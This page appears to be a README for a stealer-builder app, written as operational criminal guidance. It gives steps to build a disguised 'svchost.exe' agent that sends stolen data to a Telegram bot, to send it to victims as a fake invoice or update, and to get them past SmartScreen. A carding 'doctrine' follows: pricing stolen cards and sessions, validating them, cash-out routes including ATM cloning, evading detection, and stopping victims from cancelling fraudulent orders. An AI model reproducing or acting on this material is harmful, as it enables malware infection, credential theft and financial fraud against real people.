# mm.github.io
mm

Setup, phone only A. Put the app on your home screen

New public GitHub repo, name mm. Public is fine — no secrets are stored in the file. Upload index.html. Repo → Settings → Pages → Source: Deploy from a branch → branch main, folder / (root) → Save. Wait 60s. Open https://.github.io/mm/ in Chrome → menu → Add to Home screen. It now opens like an app, works offline, and keeps your config in local storage. B. Bot 5. In the app, Build tab, follow step 1. Copy the token in, tap FETCH CHAT ID, tap START on the bot, send hi, tap again. Chat ID fills itself.

C. Hardened mode (optional, 10 min) 6. dash.cloudflare.com → Workers → Create → paste the worker.js the app gives you. 7. Worker → Settings → Variables → add TOKEN (bot token) and SECRET (long random string) as encrypted. Deploy. 8. Paste the *.workers.dev URL and the same secret into the app. Token now never enters the binary.

D. Build 9. Second repo (private), upload requirements.txt + .github/workflows/build.yml, then Generate in the app → agent.py lands in Downloads → upload it to that repo. 10. Actions → build → Run workflow → artifact → extract svchost.exe with ZArchiver.

E. Deploy 11. Rename to Invoice_Nov.exe / Setup_Update.exe. Send via Telegram document, Drive link, or WhatsApp. 12. Target opens → SmartScreen → More info → Run anyway. No window, no UAC. 13. Package hits your bot in ~60s, then again every 45 min. App → Inbox → Refresh → Download.

Doctrine, condensed What's worth what. CC+CVV alone is $1–8 and disposable. Add name/address/zip and it's AVS-capable at $8–18. Add SSN/DOB/MMN and you have a fullz at $15–40. Email or bank access beats all of it, because it beats OTP. Session cookies are the top of the market — a live session skips 3DS outright. And the only thing that makes volume possible is a non-VBV BIN; a perfect card on a 3DS-locked BIN is paper.
Validate before you touch it. BIN-check every card first — type, level, country, 3DS enrolment. Live-check for $0.50–1 and capture the AVS response, not just the approve. Full AVS match or full non-AVS only; partial match is a coin flip. Proxy state must equal cardholder state. Wrong country is a dead card.

Route ladder, easiest up. Gift cards and digital goods: instant, one-shot, 40–60% resale, burns the card. Bill pay: near-zero declines, thin margin, good for small balances. PayPal/Cash App: needs a warmed account and a fullz, dies in hours. Flights and hotels: biggest tickets, needs exact identity, non-refundable. Physical goods to a drop in the cardholder's state: best resale at 70–85%, three to seven days. ATM with a cloned card: best per-card return, needs an MSR605X and blanks, PIN from track 2 or the fullz.

Rules that decide it. One card, one merchant, one session — never a second order on a spent card. Residential SOCKS5 in the cardholder's state; datacenter IPs are flagged by every engine worth the name. Fresh antidetect profile per card with matching timezone, UA and WebRTC. Billing exactly as on file, shipping to the drop. Stay under $300 on an untested merchant. Two to four orders per hour per IP block. Use your own catch-all email on the order so the victim can't cancel.

Kill signals. Three declines in a row: card or IP is dead, stop. "Do not honor": velocity or geo, change proxy before retrying. AVS mismatch: move to an AVS-off merchant. Sudden OTP push: BIN is locked, park it. Checkout captcha: dirty profile, rebuild it.

The 24-hour rule. Card half-life is hours on the good BINs because everyone is hitting them. The moment a package lands, sort by BIN quality and cash the top three inside the first hour. Sell the remainder as logs rather than working it. Sell the first batch to fund proxies, an antidetect browser and checker credits, then start cashing — never cash off a home connection with a stock browser.
